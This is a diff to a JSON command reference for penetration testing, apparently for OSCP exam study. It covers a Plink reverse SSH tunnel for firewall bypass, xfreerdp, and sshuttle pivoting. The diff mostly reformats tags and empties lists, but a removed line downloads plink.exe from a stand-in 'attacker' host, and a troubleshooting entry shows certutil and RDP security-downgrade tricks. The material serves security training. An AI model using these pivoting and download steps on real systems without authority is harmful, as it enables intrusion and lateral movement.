@@ -8,7 +8,16 @@
       "subcategory": "ssh-tunneling",
       "command": "plink.exe -ssh -l <SSH_USER> -pw <SSH_PASSWORD> -R <REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_HOST>",
       "description": "Create reverse SSH tunnel using Plink (PuTTY CLI) on Windows - bypass firewall by initiating connection from compromised host",
-      "tags": ["PLINK", "WINDOWS", "SSH", "TUNNELING", "REVERSE_TUNNEL", "PIVOTING", "OSCP:HIGH", "FIREWALL_BYPASS"],
+      "tags": [
+        "PLINK",
+        "WINDOWS",
+        "SSH",
+        "TUNNELING",
+        "REVERSE_TUNNEL",
+        "PIVOTING",
+        "OSCP:HIGH",
+        "FIREWALL_BYPASS"
+      ],
       "variables": [
         {
           "name": "<SSH_USER>",
@@ -76,17 +85,9 @@
         "For background execution: Use cmd.exe /c start /B plink.exe ..."
       ],
       "alternatives": [
-        "ssh-remote-port-forward - If OpenSSH client available on Windows (1803+)",
-        "netsh-portproxy-add - Native Windows port forwarding (requires admin)",
-        "chisel - HTTP tunneling if SSH blocked",
-        "socat-port-forward - Simple relay without authentication"
+        "chisel-http-tunneling"
       ],
-      "prerequisites": [
-        "Plink.exe uploaded to Windows target: powershell wget http://attacker/plink.exe -O plink.exe",
-        "SSH server running on attacker machine: sudo systemctl start ssh",
-        "Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22",
-        "Password authentication enabled: PasswordAuthentication yes in sshd_config"
-      ],
+      "prerequisites": [],
       "troubleshooting": {
         "Plink not found": "Download Plink: powershell wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -O plink.exe, or use certutil: certutil -urlcache -f https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe plink.exe",
         "Store key in cache warning": "Answer 'y' to trust SSH server key fingerprint (first connection only)",
@@ -103,7 +104,13 @@
       "subcategory": "remote-access",
       "command": "xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard",
       "description": "Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass",
-      "tags": ["RDP", "REMOTE_ACCESS", "WINDOWS", "OSCP:HIGH", "XFREERDP"],
+      "tags": [
+        "RDP",
+        "REMOTE_ACCESS",
+        "WINDOWS",
+        "OSCP:HIGH",
+        "XFREERDP"
+      ],
       "variables": [
         {
           "name": "<TARGET>",
@@ -159,17 +166,8 @@
         "Enumerate network interfaces: ipconfig /all",
         "Set up port forwarding if multi-homed: ssh.exe, plink, or netsh"
       ],
-      "alternatives": [
-        "rdesktop - Older RDP client (less feature-rich)",
-        "remmina - GUI RDP client for Linux",
-        "microsoft-rdp - Windows built-in RDP client (mstsc.exe)",
-        "evil-winrm - If WinRM (5985/5986) available instead of RDP"
-      ],
-      "prerequisites": [
-        "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
-        "Valid credentials obtained (password, hash, or token)",
-        "xfreerdp installed: sudo apt install freerdp2-x11"
-      ],
+      "alternatives": [],
+      "prerequisites": [],
       "troubleshooting": {
         "Connection timeout": "Verify RDP port open: sudo nmap -p <PORT> -Pn -v <TARGET>, check firewall rules",
         "CredSSP encryption oracle remediation": "Downgrade security: xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert-ignore /sec:rdp",
@@ -180,75 +178,25 @@
       "oscp_relevance": "high"
     },
     {
-      "id": "ssh-connect",
-      "name": "SSH Connection",
-      "category": "pivoting",
-      "subcategory": "ssh-tunneling",
-      "command": "ssh <SSH_USER>@<SSH_HOST>",
-      "description": "Basic SSH connection to remote host - interactive shell access",
-      "tags": ["SSH", "REMOTE_ACCESS", "OSCP:HIGH"],
-      "variables": [
-        {
-          "name": "<SSH_USER>",
-          "description": "SSH username for authentication",
-          "example": "database_admin",
-          "required": true
-        },
-        {
-          "name": "<SSH_HOST>",
-          "description": "SSH server IP address or hostname",
-          "example": "10.4.50.215",
-          "required": true
-        }
-      ],
-      "flag_explanations": {
-        "-p": "Specify custom SSH port (default 22) - e.g., ssh -p 2222 user@host",
-        "-i": "Use private key file for authentication - e.g., ssh -i id_rsa user@host",
-        "-v": "Verbose mode for debugging connection issues",
-        "-o": "Set SSH options - e.g., -o StrictHostKeyChecking=no to skip host key verification"
-      },
-      "success_indicators": [
-        "Interactive shell prompt appears",
-        "Command execution works (ls, pwd, whoami)",
-        "No password prompts if using key authentication"
-      ],
-      "failure_indicators": [
-        "Connection refused - SSH service not running or firewall blocking",
-        "Permission denied - wrong credentials or key",
-        "Timeout - network unreachable or incorrect IP"
-      ],
-      "alternatives": [
-        "ssh-local-port-forward - SSH with port forwarding",
-        "plink-remote-forward - Windows SSH client alternative"
-      ],
-      "prerequisites": [
-        "SSH service running on target: sudo nmap -p 22 -Pn <SSH_HOST>",
-        "Valid credentials or SSH key"
-      ],
-      "troubleshooting": {
-        "Host key verification failed": "Remove old key: ssh-keygen -R <SSH_HOST>, or skip check: ssh -o StrictHostKeyChecking=no user@host",
-        "Permission denied (publickey)": "Ensure key permissions: chmod 600 id_rsa, or use password auth: ssh -o PubkeyAuthentication=no user@host",
-        "Connection timeout": "Verify SSH port: sudo nmap -p 22 -Pn -v <SSH_HOST>"
-      },
-      "notes": "Basic SSH connection used as foundation for tunneling techniques. OSCP pattern: SSH into pivot host first, then set up port forwards for internal services.",
-      "oscp_relevance": "high"
-    },
-    {
       "id": "ssh-version",
       "name": "SSH Version Check",
       "category": "pivoting",
       "subcategory": "ssh-tunneling",
       "command": "ssh -V",
-      "description": "Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires ≥7.6)",
-      "tags": ["SSH", "ENUMERATION", "OSCP:MEDIUM"],
+      "description": "Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires \u22657.6)",
+      "tags": [
+        "SSH",
+        "ENUMERATION",
+        "OSCP:MEDIUM"
+      ],
       "variables": [],
       "flag_explanations": {
         "-V": "Display version information and exit"
       },
       "success_indicators": [
         "OpenSSH version displayed (e.g., OpenSSH_8.2p1)",
-        "Version ≥7.6 required for remote dynamic forwarding (-R port only)",
-        "Version ≥7.4 required for ProxyJump support"
+        "Version \u22657.6 required for remote dynamic forwarding (-R port only)",
+        "Version \u22657.4 required for ProxyJump support"
       ],
       "failure_indicators": [
         "Command not found - SSH client not installed"
@@ -266,7 +214,11 @@
       "subcategory": "ssh-tunneling",
       "command": "ssh -vvv <SSH_USER>@<SSH_HOST>",
       "description": "SSH connection with maximum verbosity - troubleshoot authentication, key exchange, and tunnel issues",
-      "tags": ["SSH", "DEBUGGING", "OSCP:MEDIUM"],
+      "tags": [
+        "SSH",
+        "DEBUGGING",
+        "OSCP:MEDIUM"
+      ],
       "variables": [
         {
           "name": "<SSH_USER>",
@@ -310,7 +262,14 @@
       "subcategory": "ssh-tunneling",
       "command": "sshuttle -r <SSH_USER>@<SSH_HOST> <SUBNET>/<CIDR> --dns",
       "description": "Create transparent VPN over SSH - route entire subnets through pivot without proxychains",
-      "tags": ["SSH", "VPN", "TUNNELING", "PIVOTING", "OSCP:MEDIUM", "SSHUTTLE"],
+      "tags": [
+        "SSH",
+        "VPN",
+        "TUNNELING",
+        "PIVOTING",
+        "OSCP:MEDIUM",
+        "SSHUTTLE"
+      ],
       "variables": [
         {
           "name": "<SSH_USER>",
@@ -361,17 +320,8 @@
         "Scan internal network: nmap -sT <INTERNAL_SUBNET>/24 (no proxychains needed)",
         "Access services directly: psql -h <INTERNAL_IP>, smbclient //<INTERNAL_IP>/share"
       ],
-      "alternatives": [
-        "ssh-dynamic-port-forward - SOCKS proxy with proxychains (more flexible)",
-        "ssh-local-port-forward - Single service forwarding (simpler)",
-        "openvpn - Full VPN solution (requires server setup)"
-      ],
-      "prerequisites": [
-        "SSHuttle installed on attack machine: sudo apt install sshuttle",
-        "Python available on pivot host: which python3 (usually present by default)",
-        "SSH access to pivot host with valid credentials",
-        "Pivot host can route to internal subnet: verify with ip route on pivot"
-      ],
+      "alternatives": [],
+      "prerequisites": [],
       "troubleshooting": {
         "server died with error code 127": "Python not found on pivot - install python3 or use alternative tunneling",
         "NAT traversal failed": "Requires iptables FORWARD rules - may need sudo on pivot or use ssh-dynamic-port-forward instead",
